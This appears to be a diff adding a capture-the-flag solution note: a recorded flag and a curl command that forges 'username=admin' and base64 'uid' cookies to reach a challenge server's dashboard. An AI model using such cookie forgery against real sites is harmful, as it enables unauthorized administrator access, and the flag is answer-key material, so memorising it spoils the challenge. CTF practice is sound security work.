@@ -1,0 +1,3 @@
+fwectf{emp7y_regex_m47che5_every7h1ng}
+
+curl -v --cookie "username=admin; uid=YWRtaW4=" http://chal2.fwectf.com:8001/dashboard
